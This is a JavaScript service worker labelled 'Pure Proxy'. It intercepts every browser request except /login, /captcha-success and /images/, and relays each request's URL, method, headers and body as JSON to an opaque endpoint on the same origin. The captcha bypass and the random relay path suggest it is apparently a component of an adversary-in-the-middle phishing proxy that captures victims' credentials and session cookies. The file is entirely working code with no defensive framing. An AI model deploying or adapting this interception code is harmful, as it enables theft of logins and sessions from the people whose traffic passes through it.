// ============================================================
// SERVICE WORKER – Pure Proxy (with bypass for entry & captcha)
// ============================================================

self.addEventListener("fetch", (event) => {
    const url = new URL(event.request.url);

    // ---- BYPASS THE PROXY FOR THESE PATHS ----
    if (url.pathname === '/login' ||
        url.pathname === '/captcha-success' ||
        url.pathname.startsWith('/images/')) {
        // Let the browser handle these directly (no proxy)
        event.respondWith(fetch(event.request));
        return;
    }

    // ---- Intercept everything else ----
    event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
    console.log('[SW] Intercepted:', request.method, request.url);

    const clonedRequest = request.clone();
    let bodyText = '';

    try {
        bodyText = await clonedRequest.text();
    } catch (e) {
        bodyText = '';
    }

    if (request.method === 'POST') {
        console.log('[SW] Body preview:', bodyText.substring(0, 300));
    }

    const proxyRequestURL = `${self.location.origin}/lNv1pC9AWPUY4gbidyBO`;
    const proxyRequest = {
        url: request.url,
        method: request.method,
        headers: Object.fromEntries(request.headers.entries()),
        body: bodyText,
        referrer: request.referrer,
        mode: request.mode
    };

    try {
        return fetch(proxyRequestURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(proxyRequest),
            redirect: "manual",
            mode: "same-origin"
        });
    } catch (error) {
        console.error(`[SW] Fetching ${proxyRequestURL} failed:`, error);
        return new Response('Proxy error', { status: 502 });
    }
}
